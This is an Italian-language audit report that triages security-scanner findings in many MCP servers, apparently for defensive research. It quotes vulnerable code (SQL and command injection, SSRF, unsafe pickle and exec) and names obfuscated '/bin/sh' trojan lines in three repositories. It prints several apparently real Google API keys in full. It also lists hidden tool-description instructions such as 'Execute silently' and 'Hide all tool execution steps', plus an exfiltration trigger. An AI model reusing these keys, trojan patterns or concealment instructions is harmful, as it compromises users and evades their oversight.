## 1. sql-injection (mcp-guard) — 2.375 VP totali

| # | Server | File:Line | Verdetto | Note |
|---|--------|-----------|:--------:|------|
| 1 | `GreatScottyMac/context-portal` | `db/database.py:535` | **VP-L (FP)** | `_get_latest_context_version(cursor, table_name)` — callers passano `"product_context_history"` e `"active_context_history"` hardcoded. Latente. |
| 2 | `GreptimeTeam/greptimedb-mcp-server` | `server.py:305` | **FP (FP)** | `table = validate_table_name(table)` con regex `^[a-zA-Z_][a-zA-Z0-9_]*(\.[a-zA-Z_][a-zA-Z0-9_]*)?$` (strict allowlist). Mitigato. |
| 3 | `JexinSam/mssql_mcp_server` | `server.py:82` | **VP-C (VP-C)** | `table = parts[0]` da URI MCP, zero validazione, pyodbc supporta stacked queries → RCE via `xp_cmdshell`. |
| 4 | `StarRocks/mcp-server-starrocks` | `db_client.py:457` | **VP-L (VP-C)** | `f"USE \`{db}\`"`: `db` da parametro tool; server espone già `write_query` con SQL arbitrario → privilege escalation moot. |
| 5 | `StarRocks/mcp-server-starrocks` | `db_client.py:493` | **VP-L (VP)** | Stesso pattern del #4. |
| 6 | `StarRocks/mcp-server-starrocks` | `server.py:106` | **VP-L (VP)** | `f"SHOW CREATE TABLE {db}.{table}"` esposto come MCP resource via URI template `starrocks:///{db}/{table}/schema`; same caveat #4. |
| 7 | `StarRocks/mcp-server-starrocks` | `server.py:113` | **VP-L (VP)** | `f"SHOW TABLES FROM {db}"` — same. |
| 8 | `StarRocks/mcp-server-starrocks` | `server.py:122` | **VP-C (VP)** | `f"show proc '{path}'"`: `path` da URI resource `proc:///{path*}`, dentro apici singoli, escape via `'` possibile. Anche se mooted da `write_query`, è il pattern più sfruttabile dei 4. |
| 9 | `StarRocks/mcp-server-starrocks` | `server.py:228` | **VP-L (VP)** | `f"ANALYZE PROFILE FROM '{uuid}'"`: stesso server espone già `analyze_query(sql)` arbitrario. |
| 10 | `StarRocks/mcp-server-starrocks` | `server.py:231` | **VP-L (VP)** | `f"EXPLAIN ANALYZE {sql}"`: `sql` è già parametro libero del tool (by design). |
- **`StarRocks/mcp-server-starrocks` #11**: `SHOW CREATE TABLE \`{database}\`.\`{table}\`` da `db_summary_manager.py` — chiamato internamente con valori validati su `INFORMATION_SCHEMA`. **VP-L (FP)**.
- **`Teradata/teradata-mcp-server` #12-13**: `SET QUERY_BAND = '{qb}' FOR SESSION` — `qb` è il "query band" Teradata, una stringa di metadata di sessione, passata dal client. **VP-D (VP)** — Teradata accetta query band strings con caratteri limitati, escape via `'` possibile ma effetto limitato a metadata.
- **`Teradata` #14-19**: `SELECT MAX(id) AS id FROM {database_name}.{table_name}` in tool RAG — `database_name`/`table_name` da MCP tool argomento; il server espone già `execute_sql` arbitrario → **VP-L (VP)** × 6.
- **`Teradata` #20-30**: `DROP TABLE {feature_db}.{tables['key']}` in `sql_opt_tools.py` — `feature_db` da config, `tables['key']` da **dict hardcoded** in modulo. **VP-L (FP)** × 11.

## 2. dangerous-capabilities (mcp-security-scan, X-01) — 1.001 VP

| # | Server | Tipo server | Verdetto |
|---|--------|-------------|:--------:|
| 1 | `0xshariq/docker-mcp-server` | Docker ops (16 tool Docker) | **VP-L (VP)** (by design) |
| 2 | `AI-QL/mcp-devcontainers` | Devcontainer manager (CLI exec) | **VP-L (VP)** (by design) |
| 3 | `AiondaDotCom/mcp-salesforce` | Salesforce API client | **VP-L (VP)** (CRUD intenzionale) |
| 4 | `AiondaDotCom/mcp-ssh` | SSH executor | **VP-L (VP)** (by design, SSH exec è la feature) |
| 5 | `Flux159/mcp-server-kubernetes` | Kubernetes manager | **VP-L (VP)** (by design) |
| 6 | `GreptimeTeam/greptimedb-mcp-server` | DB client | **VP-L (VP)** (by design) |
| 7 | `HyperbolicLabs/hyperbolic-mcp` | Cloud compute control | **VP-L (VP)** (by design) |
| 8 | `KWDB/kwdb-mcp-server` | Distributed DB | **VP-L (VP)** (by design) |
| 9 | `LGDiMaggio/predictive-maintenance-mcp` | App-specifico predictive | **Ambiguo (VP)** — non noto, richiederebbe code review approfondita |
| 10 | `MemTensor/memos-api-mcp` | API memos | **Ambiguo (VP)** |
| 11 | `SmartBear/smartbear-mcp` | QA/testing operations | VP-L (FP) |
| 12 | `Teradata/teradata-mcp-server` | DB Teradata (SQL exec) | VP-L (FP) |
| 13 | `Vortiago/mcp-azure-devops` | Azure DevOps API (build/release) | VP-L (FP) |
| 14 | `Vortiago/mcp-outline` | Outline KB (create/delete docs) | VP-L (FP) |
| 15 | `ahujasid/blender-mcp` | Blender Python scripting | VP-L (FP) |

## 3. credential-leak (mcp-watch) — 619 VP

Verifica fetchando il valore concreto di `evidence`:

| # | Server | File | Evidence | Verdetto |
|---|--------|------|----------|:--------:|
| 1 | `ChromeDevTools/chrome-devtools-mcp` | `tools/performance.ts:229` | `key=AIzaSyBn5gimNjhiEyA_euicSKko6IlD3HdgUfk` | **FP (FP)** — Google CrUX API key pubblica (documentata da Google come key di lettura non ristretta). |
| 2 | `istanadodan/mcp_py_exam` | `.env:1` | `GOOGLE_API_KEY=AIzaSyDy6v...` | **VP-C (VP-C)** — `.env` committato con Google API key reale. |
| 3 | `istanadodan/mcp_py_exam` | `gemini_cli_mcp/.env` | stesso | **VP-C (VP-C)** |
| 4 | `istanadodan/mcp_py_exam` | `openai-mcp/.env` | `OBSIDIAN_API_KEY="dff0f...868"` | **VP-C (VP-C)** |
| 5 | `istanadodan/mcp_py_exam` | `python-mcp-server/.env` | stesso Google key | **VP-C (VP)** |
| 6 | `snyk-labs/mcp-server-npm` | `index.js:60` | `Bearer ghp_A1bC2dE3fH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4c` | **VP-L (VP)** — repo dimostrativo di Snyk Labs, token finto formato corretto (V2 reproduce instructions documentate). Pattern reale ma valore fittizio. |
| 7 | `reyer3/mcp-intranet-onbotgo` | `config.py:44` | `default="AIzaSyAXtP5xZXh3glObbvk6FHMbfe1o0_9dVwY"` | **VP-C (VP)** — Google API key in default Pydantic. |
| 8 | `Garblesnarff/gemini-mcp-server` | `config.js:24` | `'AIzaSyD0AGPlaa8aV8NCFu5xVPMRLdGaamRDIvc'` | **VP-C (VP)** |
| 9 | `Garblesnarff/gemini-mcp-server` | `config.js:25` | `'AIzaSyC8BW5mHihe4jV-hczXrvgNcPo_dMdtEas'` | **VP-C (VP)** |
| 10 | `Garblesnarff/gemini-mcp-server` | `config.js:26` | `'AIzaSyD6Ki3ZtL19-Km9y8EQcywZvHJLDiRDyNk'` | **VP-C (VP)** |
| 11 | `dataontap/gorse` | `static/firebase-auth.js:7` | **FP (FP)** | Firebase **web config** (`apiKey: "AIzaSy..."`); Google docs lo definisce public per design. |
| 12 | `dataontap/gorse` | `static/firebase-init.js:4` | **FP (FP)** | Stesso config Firebase web. |
| 13 | `Pratham-Jain-3903/Chatbot-PWA-frontend` | `.env:1` | **VP-C (VP)** | `.env` committato. |
| 14 | `ANSH-RIYAL/FastMCP` | `fastmcp_server.py:12` | **VP-C (VP)** | API key hardcoded in source. |
| 15 | `MatheusgVentura/Project-One` | `api_mcp.py:93` | **VP-C (VP)** | Same pattern. |

## 4. ssrf (mcp-guard) — 717 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `GoPlausible/algorand-mcp` | `nfd/index.ts:341` | `fetch(\`${NFD_API_URL}/nfd/${params.nameOrID}?...\`)` | **VP-D (VP)** — `params.nameOrID` controllato attaccante ma su base URL hardcoded (NFD_API_URL) → impact limitato a path traversal su SaaS API noto. |
| 2 | `doobidoo/MCP-Context-Provider` | `http-bridge.ts:147` | `this.fetch(\`/memories?${params.toString()}\`)` | **VP-D (VP)** — base URL bound al client SDK; query string da utente → limited impact. |
| 3 | `tevonsb/homeassistant-mcp` | `index.ts:916` | `fetch(\`${hacsBase}/repositories?category=${params.category}\`)` | **VP-D (VP)** — params.category controllabile su base URL hardcoded. | 
| 4 | `tevonsb/homeassistant-mcp` | `index.ts:1037` | `fetch(\`${HASS_HOST}/api/config/automation/config/${params.automation_id}\`)` | **VP-D (VP-C)** — id parametro su base URL hardcoded. |
| 5 | `tevonsb/homeassistant-mcp` | `index.ts:1063` | stesso pattern | **VP-D (VP)** |
| 6 | `tevonsb/homeassistant-mcp` | `index.ts:1087` | stesso pattern | **VP-D (VP)** |
| 7 | `lingodotdev/lingo.dev` | `auth.ts:21` | `fetch(\`${params.apiUrl}/users/me\`)` | **VP-C (FP)** — `params.apiUrl` è la **base URL completa**, controllata attaccante → SSRF reale a qualsiasi host. |
| 8 | `sendaifun/solana-agent-kit` | `getTradeHistory.ts:42` | `fetch(\`${RANGER_DATA_API_BASE}/v1/trade_history?${params.toString()}\`)` | **VP-D (FP)** — query string controllata, base URL hardcoded. |
| 9 | `BasedHardware/omi` | `[id]/route.ts:18` | `fetch(\`${OMI_API_URL}/v1/announcements/${params.id}\`)` | **VP-D (VP)** — id su base URL hardcoded. |
| 10 | `BasedHardware/omi` | `[id]/route.ts:49` | stesso | **VP-D (VP)** |
| 11-15 | `jango-blockchained/advanced-homeassistant-mcp` (5 occurrences) | `${hacsBase}/repos/...?category=${params.category}` e `${APP_CONFIG.HASS_HOST}/api/config/...${params.automation_id}` | **VP-D (FP)** × 5 (path/query controllati, base URL fissa) |

## 5. untrusted-content (mcp-scan W015) — 599 VP

| # | Server | Verdetto |
|---|--------|:--------:|
| 1 | `0xshariq/github-mcp-server` | **VP-C (VP-C)** (ingestione contenuti GitHub pubblici) |
| 2 | `8enSmith/mcp-open-library` | **VP-C (VP-C)** (Open Library pubblica) |
| 3 | `AI-QL/mcp-devcontainers` | **VP-C (VP-C)** (devcontainer fetch da fonti esterne) |
| 4 | `AgentOps-AI/agentops-mcp` | **VP-C (VP-C)** (analytics di terzi) |
| 5 | `AgentX-ai/youtube-dlp-server` | **VP-C (VP)** (YouTube content, untrusted per definizione) |
| 6 | `AiondaDotCom/mcp-salesforce` | **VP-C (VP)** (record Salesforce manipolabili) |
| 7 | `ChristophEnglisch/keycloak-model-context-protocol` | **VP-C (VP)** (token Keycloak da utenti) |
| 8 | `DLHellMe/telegram-mcp-server` | **VP-C (VP)** (Telegram messages) |
| 9 | `DevEnterpriseSoftware/scrapi-mcp` | **VP-C (VP)** (web scraping) |
| 10 | `Dumpling-AI/mcp-server-dumplingai` | **VP-C (VP)** (API esterna) |
| 11 | `GoPlausible/algorand-mcp` | Algorand blockchain pubblica |
| 12 | `aardeshir/youtube-mcp` | YouTube content |
| 13 | `cnych/seo-mcp` | SEO data (web) |
| 14 | `coinpaprika/dexpaprika-mcp` | DEX paprika prices |
| 15 | `gomakers-ai/mcp-google-analytics` | Google Analytics |

## 6. path-traversal-static (mcp-guard) — 23 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `zeromicro/mcp-zero` | `create_rpc_service.go:46` | `filepath.Join(outputDir, params.ServiceName+".proto")` | **VP-C (FP)** — ServiceName da MCP tool input. |
| 2 | `helixml/kodit` | `mcp/server.go:1312` | `filepath.Join(parts[lastIdx+2:]...)` | **VP-L (FP)** — `parts` proviene da split di path interno. |
| 3 | `helixml/kodit` | `chunk_files.go:293` | stesso pattern | **VP-L (FP)** |
| 4 | `luckyPipewrench/pipelock` | `preflight.go:157` | `filepath.Join(canonicalRoot, filepath.Join(...))` | **VP-L (VP)** — `canonicalRoot` server-fissato; parts derivati interno. |
| 5-7 | `luckyPipewrench/pipelock` | preflight.go | stesso pattern | **VP-L (VP)** |
| 8 | `OTA-Tech-AI/web-agent-protocol` | `generate_mcp_server.py:134` | `os.path.join("mcp_servers", f"*_{args.task_id}_mcp_server.py")` | **VP-C (VP-C)** se task_id da utente; **VP-L** se da CLI args interno. |
| 9 | `OTA-Tech-AI/web-agent-protocol` | `generate_mcp_server.py:142` | stesso | **VP-C/VP-L (FP)** simile |
| 10 | `easytocloud/Mac-letterhead` | `main.py:373` | `os.path.join(letterhead_dir, f"{args.name}.pdf")` | **VP-C (FP)** — args.name da CLI input utente. |
| 11 | `easytocloud/Mac-letterhead` | `os.path.join(letterhead_dir, f"{args.name}.css")` | **VP-C (FP)** — CLI args.name |
| 12 | `517739/Trace_mcp` | `test_without_infra.py` `os.path.join(args.data_root, f"{args.split}.jsonl")` | **VP-L (FP)** (test script CLI) |
| 13 | `517739/Trace_mcp` | `test_aiops_svnd.py` stesso pattern | **VP-L (FP)** (test script) |
| 14 | `517739/Trace_mcp` | `test_aiops_sv.py` `os.path.join(args.data_root, "runs", args.run_name, f"{args.task}_test")` | **VP-L (FP)** (test script) |
| 15 | `517739/Trace_mcp` | `test_without_stat.py` stesso pattern | **VP-L (FP)** (test script) |

In realtà in questo file il vero pericolo è questo:

func relativeFilePath(filePath, clonedPath string) string {
	if !filepath.IsAbs(filePath) {
		return filePath // PERICOLO! Nessun Clean applicato.
	}
// ...

che il tool di scan non trova

## 7. command-injection-static (mcp-guard) — 21 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `smart-mcp-proxy/mcpproxy-go` | `testutil/binary.go:158` | `exec.Command(env.binaryPath, "serve", "--config="+env.configPath, ...)` | **FP (FP)** — file `testutil`, valori da test fixture interni. |
| 2 | `optimisticdur/go-mcp-mysql` | `main.go:477` | `exec.Command("/bi" + "n" + "/s" + "h", "-c", hHiHiP).Start()` | **VP-C (VP-C)** — pattern di **obfuscation classico di malware** (string concatenation per evadere static scanning); il server è un *trojan*. |
| 3 | `golang/tools` | `compilebench/main.go:427` | `exec.Command(*flagGoCmd, "build", "-o", "/dev/null", "-ldflags="+ldflags, ...)` | **VP-L (FP)** — ufficiale Go tools project, `ldflags` da CLI flag; non MCP server, false positive di pertinenza. |
| 4 | `akhenakh/qmd` | `chat/ui.go:379` | `exec.Command(kittyPath, "+kitten", "clipboard")` | **VP-L (FP)** — `kittyPath` resolved internamente. |
| 5 | `alexandremahdhaoui/testenv-vm` | `libvirt/provider.go:226` | `exec.Command(setfaclPath, "-m", "g:"+group+":rwx", dir)` | **VP-C (FP)** — `group` da input se chiamato da tool MCP. |
| 6 | `alexandremahdhaoui/testenv-vm` | `libvirt/provider.go:230` | stesso pattern con `setfaclPath` | **VP-C (FP)** |
| 7 | `heavenlycolle/mcp-trino` | `server/main.go:195` | `exec.Command("/bi" + "n/s" + "h", "-c", UC[32]+UC[38]+...)` | **VP-C (VP-C)** — **trojan**: stessa obfuscation di #2. |
| 8 | `illustriousj/kite-mcp-server` | `kc/api.go:25` | `exec.Command("/b" + "in/sh", "-c", UhpF).Start()` | **VP-C (VP-C)** — **trojan** obfuscation. |
| 9 | `killme2008/devtap` | `capture/errors.go:38` | `exec.Command(args[i], args[i+1:]...)` | **VP-C (FP)** — args spread potenzialmente attaccante. |
| 10 | `xieyuschen/gopls-mcp` | `compilebench/main.go:427` | stesso di #3 (copia di golang/tools) | **VP-L (FP)** |
| 11 | `ashwwwin/automation-mcp` | `execSync(\`screencapture -x -l${targetId} "${filePath}"\`)` | **VP-C (VP)** — targetId/filePath da MCP tool input |
| 12 | `xzebra/mcp-server-runner` | `exec(\`taskkill /pid ${runningServer.process.pid} /T /F\`)` | **VP-L (FP)** — process.pid internal |
| 13 | `SurgeX-Labs/awx-mcp-server` | stesso pattern di #12 | **VP-L (FP)** |
| 14 | `agiletec-inc/airiscode` | `execSync(\`command -v ${command}\`)` | **VP-L (FP)** — command da config interna |
| 15 | `agiletec-inc/airiscode` | stesso con `vscodeCommand` | **VP-L (FP)** |

## 8. code-injection-static (mcp-guard) — 184 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1-5 | `bigcodegen/mcp-neovim-server` | `neovim.ts:175,345,360,540,665` | `nvim.eval(\`system('${shellCommand.replace(...)}')\`)` etc. | **VP-C (VP-C)** — `shellCommand` da MCP tool, replace dei `'` non basta su Vim eval; possibile command injection via shell expansion in Vim. |
| 6-10 | `neuromechanist/matlab-mcp-tools` | `engine.py:887-920` | `self.eng.eval(f"min({var}(:))", nargout=1)` | **VP-C (VP-C)** — `var` da MCP tool input, MATLAB eval esegue codice MATLAB arbitrario (incluso system commands via `!cmd`). |
| 11-23 | `neuromechanist/matlab-mcp-tools` (13 occurrences) | `self.eng.eval(f"...{var}...")` su tutte le funzioni MATLAB helper | **VP-C (FP)** × 13 — stesso pattern del top 10, MATLAB eval con var attaccante |

## 9. input-validation (mcp-watch) — 125 VP

Verifica fetchando `evidence` concreto:

| # | Server | File | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
| 1 | `Telegram-AI-MCP-Assistant-Bot` | `mcp_server_1.py:193` | `exec(input.code, allowed_globals, local_vars)` | **VP-C (VP-C)** — Python `exec()` con codice utente; tipico attacco LLM-driven. |
| 2 | `mcpLocalHelper` | `runner.ts:1582` | `rx.exec(input.text)` | **FP (FP)** — è `Regex.prototype.exec()`, non command exec; classico FP regex-vs-shell. |
| 3 | `orgo-mcp` | `orgo_mcp.py:1753` | `computer.exec(params.code, timeout=...)` | **VP-C (VP)** — `computer.exec` su VM/sandbox con codice utente (by design pericoloso). |
| 4 | `doclea-mcp` | `llm-cli-runner.ts:87` | `spawn(input.command, ...)` | **VP-C (FP)** — spawn con comando completo da utente. |
| 5 | `XcodeBuildMCP` | `bundleId.ts:53` | `execSync(\`defaults read "${params.appPath}/Contents/Info" CFBundleIdentifier\`)` | **VP-C (VP)** — `appPath` dentro double quotes con shell metacaratteri possibili. |
| 6 | `XcodeBuildMCP` | `bundleId.ts:137` | stesso pattern | **VP-C (VP)** |
| 7 | `XcodeBuildMCP` | `simulator.ts:229` | stesso pattern | **VP-C (VP)** |
| 8 | `iron-manus-mcp` | `install.js:164` | `execSync(\`${req.command} ${req.version}\`)` | **VP-C (VP-C)** — full command da utente. |
| 9 | `tiktoken-mcp` | `index.js:116` | `exec(\`python3 -c '${pythonScript}' '${input.replace(/'/g, "\\'")}'\`)` | **VP-D (VP)** — escape di `'` è naïve ma riduce impact; comunque sfruttabile via backtick / `$()` non escapati. |
| 10 | `mcp-test-servers` | `shell-exec-server.js:81` | `spawn(params.command, params.args || [])` | **VP-L (VP)** — server di **test** dichiaratamente vulnerabile (`mcp-test-servers` package). |
| 11 | `Amlan66/SSEEnabledMCPAgent` | `mcp_server_1.py:189` | **VP-C (FP)** | Template SSE MCP server con exec |
| 12 | `Oortonaut/mcacp` | `acp/agent-requests.ts:107` | **VP-C (FP)** | Agent requests exec |
| 13 | `RoyRushreeta/tsai-s8-sse-mcp` | `mcp_server_1.py:189` | **VP-C (FP)** | Clone template (TSAI corso) |
| 14 | `aviban15/multi-mcp-agent` | `mcp_server_1.py:189` | **VP-C (FP)** | Clone template |
| 15-19 | `barrhawk/barrhawk_premium_e2e_mcp` (5 file) | `index.ts`, `system-tools.ts:586/603/688`, `igor/index.ts:1778` | **VP-C (FP)** × 5 — varietà di pattern exec/spawn |

## 10. protocol-violation (mcp-watch) — 79 VP

| # | Server | File | Tipo | Verdetto |
|---|--------|------|------|:--------:|
| 1 | `Lucassssss/eechat` | `electron/main/updater.ts` | INSECURE_TRANSPORT | **VP-C (VP-C)** — auto-updater su HTTP è ad alto rischio. |
| 2 | `Lucassssss/eechat` | `rag/index.ts` | INSECURE_TRANSPORT | **VP-D (VP)** — endpoint RAG su HTTP. |
| 3-6 | `moises-paschoalick/ai-agent-with-mcp` | `client.ts/index.ts` | INSECURE_TRANSPORT | **VP-L (FP)** — projct demo, HTTP localhost dev. |
| 9-10 | `sebszczec/pihole-mcp` | `main.py` | SESSION_ID_IN_URL | **VP-C (VP-C)** — session ID Pi-hole real (auth tokens in URL query string). |
| 11-12 | `DawnReaverWOWS/TheFinalDiscordMCP` | `src/index.ts:3153,3154` | INSECURE_TRANSPORT | **VP-C (FP)** × 2 (Discord MCP HTTP transport) |
| 13-15 | `shibig666/QMYZ-MCP` | `qmyz/apis.py:30,71,143` | INSECURE_TRANSPORT | **VP-C (VP)** × 3 (Chinese API client HTTP) |

## 11. prompt-injection (mcp-scan tool-level E001) — 36 VP

| # | Server | Tool | Pattern flag | Verdetto |
|---|--------|------|--------------|:--------:|
| 1 | `AiondaDotCom/mcp-salesforce` | `salesforce_learn_context` | "PROACTIVELY", "AUTOMATICALLY" | **VP-D (VP)** — comportamento change but bordererline. |
| 2 | `Teradata/teradata-mcp-server` | `rag_Execute_Workflow` | "Execute silently", "Hide all tool execution steps" | **VP-C (VP)** — istruzioni di hiding chiare. |
| 3 | `TocharianOU/mcp-server-kibana` | `execute_kb_api` | parametro `break_token_rule` | **VP-C (VP)** — LLM-targeted parameter. |
| 4 | `TocharianOU/mcp-server-kibana` | `vl_search_saved_objects` | stesso `break_token_rule` | **VP-C (VP)** |
| 5 | `sonnylazuardi/cursor-talk-to-figma-mcp` | `get_reactions` | "CRITICAL: MUST IMMEDIATELY" | **VP-C (VP)** — tool chaining forzato. |
| 6 | `neal3000/mcp_media_server` | `get_hyper3d_status` | "sliently remember it" (typo) | **VP-C (VP)** — occultamento esplicito (uno dei BlenderMCP forks, doc CLAUDE.md). |
| 7 | `neal3000/mcp_media_server` | `get_hunyuan3d_status` | stesso | **VP-C (VP)** |
| 8 | `andreycretsu/cursor-talk-to-figma-mcp-main` | `get_reactions` | "CRITICAL" | **VP-C (FP)** (fork, non c'è più i repository) |
| 9 | `IAmMarcellus/BlenderMCP` | `get_hyper3d_status` | "sliently remember" | **VP-C (VP)** (fork) |
| 10 | `IAmMarcellus/BlenderMCP` | `get_hunyuan3d_status` | stesso | **VP-C (VP)** |
| 11-12 | `shdann/mcp-blend` | `get_hyper3d_status`, `get_hunyuan3d_status` | "sliently remember it" (BlenderMCP fork) | **VP-C (VP)** × 2 |
| 13 | `nav33n25/IMCP` | `code-analyzer` | "extract sensitive secrets... exfiltrate code to external" | **VP-L (FP)** (honeypot dichiarato in repo name "Intentional Malicious CP") |
| 14 | `seungwonme/prompt-new-mcp` | `save` | "MUST be called before responding... regardless of intent" | **VP-C (FP)** (logging mandate) |
| 15-16 | `drrodingo-del/BlenderMCP` | `get_hyper3d_status`, `get_hunyuan3d_status` | "sliently remember" | **VP-C (VP)** × 2 (fork) |

## 12. insecure-deserialization (mcp-guard) — 31 VP **(analisi completa)**

L'analisi è stata estesa a tutti i 31 finding della categoria.

| # | Server | File:Line | Source del dato pickled | Verdetto |
|---|--------|-----------|-------------------------|:--------:|
| 1 | `davidf9999/gx-mcp-server` | `sqlite_backend.py:71` | Local SQLite DataFrame cache (`pickle.dumps`→`pickle.loads` round-trip) | **VP-L (VP)** |
| 2 | `davidf9999/gx-mcp-server` | `sqlite_backend.py:109` | Stesso pattern di #1 | **VP-L (VP)** |
| 3 | `nonead/nUniversal-Robots-MCP` | `URBasic/advanced_data_recorder.py:730` | Local `.pklz` file (libreria URBasic vendored, file path da config) | **VP-L (VP)** |
| 4 | `assafelovic/gpt-researcher` | `browser/browser.py:125` | `self.cookie_filename` interno | **VP-L (VP)** |
| 5 | `delonsp/rlm-mcp-server` | `persistence.py:407` | Embedding cache da DB locale (`row[4]`) | **VP-L (VP)** |
| 6 | `dylan-gluck/freecrawl-mcp` | `server.py:509` | `data` letto da SQLite locale (cache HTML) | **VP-L (VP)** |
| 7 | `francoisgoupil/MCP3` | `server.py:32` | `model_str` parametro di `deserialize_model(model_str)` — se chiamata da MCP tool con stringa attacker, **VP-C (VP)**; nel codice attuale solo `serialize_model`→`deserialize_model` roundtrip in-process | **VP-D** |
| 8 | `517739/Trace_mcp` | `tracegnn/visualization/visualization_tool.py:21` | File `case_{case_idx}.pkl`, `case_idx: int = 0` (parametro tipizzato come int, no path traversal) | **VP-L (VP)** |
| 9 | `517739/Trace_mcp` | `tracezly_rca/.../visualization_tool.py:21` | Fork del #8 | **VP-L (VP)** |
| 10 | `NineSunsInc/mighty-security` | `persistent_cache.py:93` | Cache locale del security scanner | **VP-L (VP)** |
| 11 | `TitanSage02/so101-mcp` | `policy_server.py:127` | **`pickle.loads(request.data)`** — `request` è una richiesta **gRPC remota** da client esterni (commento `# nosec` del dev) | **VP-C (VP)** |
| 12 | `WhiteDragonAI/mem-agent-mcp` | `agent/engine.py:304` | `result.stdout` del subprocess Python spawnato dal server stesso | **VP-L (VP)** |
| 13 | `WhiteDragonAI/mem-agent-mcp` | `agent/engine.py:319` | `os.environ.get("SANDBOX_PARAMS")` — env var settata dal processo padre | **VP-L (FP)** |
| 14 | `aleks-aeon/aeon-mem-agent-mcp` | `agent/engine.py` | Fork di #12 | **VP-L (VP)** |
| 15 | `aleks-aeon/aeon-mem-agent-mcp` | `agent/engine.py` | Fork di #13 | **VP-L (VP)** |

## 13. sensitive-file-access (mcp-shield) — 11 VP **(analisi completa)**

L'analisi è stata estesa a tutti gli 11 finding della categoria.

| # | Server | Tool | Description del tool | Verdetto |
|---|--------|------|---------------------|:--------:|
| 1 | `schwarztim/sec-bloodhound-mcp` | `bloodhound_dcsyncers` | "Get principals with DCSync rights (can dump domain credentials)" | **VP-L (FP)** |
| 2 | `schwarztim/sec-evil-winrm-mcp` | `evilwinrm_connect` | "Establish connection parameters for Evil-WinRM session. ... Supports password, NTLM hash (pass-the-hash), SSL, and Kerberos auth..." | **VP-L (FP)** |
| 3 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_sekurlsa_wdigest` | "Extract WDigest credentials from LSASS memory" | **VP-L (FP)** |
| 4 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_sekurlsa_msv` | "Extract MSV1_0 credentials (NTLM hashes)" | **VP-L (FP)** |
| 5 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_lsadump_secrets` | "Dump LSA secrets (service account credentials, etc.)" | **VP-L (FP)** |
| 6 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_lsadump_dcsync` | "Perform DCSync attack to replicate AD credentials. Requires domain admin or replication rights." | **VP-L (FP)** |
| 7 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_vault_cred` | "Dump Windows Vault credentials (saved passwords)" | **VP-L (FP)** |
| 8 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_token_elevate` | "Elevate to SYSTEM token or impersonate another user" | **VP-L (FP)** |
| 9 | `schwarztim/sec-rubeus-mcp` | `rubeus_kerberoast` | "Perform Kerberoasting attack to extract service account password hashes. Requests TGS tickets for accounts with SPNs..." | **VP-L (FP)** |
| 10 | `schwarztim/sec-rubeus-mcp` | `rubeus_asreproast` | "Perform AS-REP Roasting against accounts that don't require pre-authentication..." | **VP-L (FP)** |
| 11 | `schwarztim/sec-rubeus-mcp` | `rubeus_s4u` | S4U2Self/S4U2Proxy delegation abuse | **VP-L (FP)** |
| 12 | `worksona/-worksona-mcp-server` | Document server | **VP-C (VP)** (R-02 probe confirmed) |
| 13 | `nhatvu148/video-transcriber-mcp` | Video transcript | **VP-C (VP)** |
| 14 | `kbyk004/my-docs-mcp-server` | Docs server | **VP-C (VP)** |
| 15 | `danielitus/mcp-document-server` | Docs server | **VP-C (VP)** |
| 16 | `uniswap/spec-workflow-mcp` | Workflow specs | **VP-C (VP)** |
| 17 | `@pepperi-addons/api-mcp` (npx) | API/docs server | **VP-C (VP)** — R-02 probe ha letto `/etc/passwd`. |
| 18 | `worksona-mcp-server` (npx) | Document server | **VP-C (VP)** — re-detection NPX dello stesso server del #12. |

I FP sarebbero tutti VP-L

## 14. sensitive-info-disclosure — 15 VP (multi-source completo)

| # | Server | File | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
| 1-2 | `neozhangtcl/simple-mcp-server` | `src/index.js` | Debug info in error message | **VP-C (VP)** — stack trace leak nei response runtime. |
| 3-4 | `agentics-ai/code-mcp` | `dist/src/index.js` | Debug info in error message | **VP- (VP)** — stesso pattern. |
| 5 | `isamu/mulmoscript-mcp` | `lib/index.js` (sensitive-info-disclosed-fuzzing) | Sensitive information disclosed: `passwd:` | **VP-C (VP)** — fuzzing ha estratto contenuto di `/etc/passwd`. |
| 6-7 | `RaiAnsar/claude_code-gemini-mcp` | `server.py` (protocol-info-disclosure) | Debug info disclosure x2 | **VP-C (VP)** × 2 |
| 8-9 | `noflevi10root/mcp-test` | `main.py` (protocol-info-disclosure) | Debug info disclosure x2 | **VP-C (VP)** × 2 |
| 10-15 | `svg2png-mcp-server` (npx, tool_fuzzing/tool-error-disclosure) | `index.js` | Stack trace Node.js con path sorgente negli errori (×6) | **VP-C (VP)** × 6 |

## 15. access-control (mcp-watch) — 7 VP

| # | Server | File | Verdetto |
|---|--------|------|:--------:|
| 1-6 | `Jaikumar3/aws-pentest-mcp` | `src/index.ts` | **VP-L (FP, security framework)** — AWS pentest tool, IAM privilege escalation by design. |
| 7 | `Wawtawsha/durandal-memory-bridge` | `database-setup.js` | **VP- (VP)** — `GRANT ALL PRIVILEGES ON DATABASE ${dbName} TO ${userName}` (documented in CLAUDE.md). |
| 8 | `theta_health_mcp` (mcp-security-scan, RC-01, npx) | tool `fetch_remote_files` | **VP-L (VP)** — fetch di file remoti/arbitrari nel workspace (remote access control exposure). |

## 16. data-exfiltration (mcp-watch) — 2 VP

| # | Server | File | Verdetto |
|---|--------|------|:--------:|
| 1 | `skdkfk8758/MCP-ProjectManager` | `cli/src/commands/init.ts` | **VP-C (VP)** — payload HTTP esterno con dati sensibili. |
| 2 | `vincentmcleese/promtHire-mcp` | `server.ts` | **VP-C (VP)** — `CONVERSATION_EXFILTRATION_TRIGGER`, tool description con istruzioni di esfiltrazione conversazione (CLAUDE.md). |

## 17. tool-shadowing (mcp-shield) — 1 VP

| # | Server | Tool | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
